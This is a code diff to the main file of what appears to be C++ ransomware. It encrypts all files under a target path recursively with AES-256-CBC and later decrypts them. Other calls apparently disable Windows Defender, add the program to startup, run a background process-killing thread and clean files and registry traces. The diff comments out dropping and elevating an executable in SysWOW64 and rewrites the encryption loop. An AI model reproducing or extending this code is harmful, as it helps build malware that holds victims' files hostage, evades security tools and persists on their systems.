@@ -1,7 +1,7 @@
 #include "pers/func.h"
 #include "pers/include.h"
 #include "pers/threads.h"
-#include "encrypt/cryptor.cpp"
+
 #include "encrypt/cryptor.h"
 
 using namespace std;
@@ -29,7 +29,7 @@ int main(int argc, char* argv[]) {
     }
     if (!checkAndCreateFile("lafkildatnn.dat")) {
         DefenderOwner();
-        CopyFileToSysWow64("C:\\Windows\\SysWOW64\\adskisatana666.exe", "test.exe");
+        //CopyFileToSysWow64("C:\\Windows\\SysWOW64\\adskisatana666.exe", "test.exe");
         addToStartup();
         Sleep(1500);
         reset();
@@ -40,7 +40,7 @@ int main(int argc, char* argv[]) {
     std::thread killerThread(StopAllShit); // Запускаем фоновый поток
     killerThread.detach();
     Sleep(2000);
-    ShellExecute(NULL, "runas", "C:\\Windows\\SysWOW64\\adskisatana666.exe", NULL, NULL, SW_SHOWNORMAL);
+    // ShellExecute(NULL, "runas", "C:\\Windows\\SysWOW64\\adskisatana666.exe", NULL, NULL, SW_SHOWNORMAL);
     // тут основной процесс закрепления 
     std::string filename = "C:\\Windows\\SysWOW64\\" + getDiskSerial() + ".txt";
 
@@ -56,8 +56,11 @@ int main(int argc, char* argv[]) {
     AES256CBC AES;
 
     AES.generateKey();
-    AES.encryptRecursively(enc_path);
-
+    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
+        std::string filename = entry.path().string();
+        if (!std::filesystem::is_directory(filename))
+            AES.encryptFile(filename);
+    }
     // { END ENCRYPTION } //
 
 
@@ -68,7 +71,11 @@ int main(int argc, char* argv[]) {
     }
 
     AES.keyFromFile();
-    AES.decryptRecursively(enc_path);
+    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
+        std::string filename = entry.path().string();
+        if (!std::filesystem::is_directory(filename))
+            AES.decryptFile(filename);
+    }
 
     cleanfile();
     cleanreg();
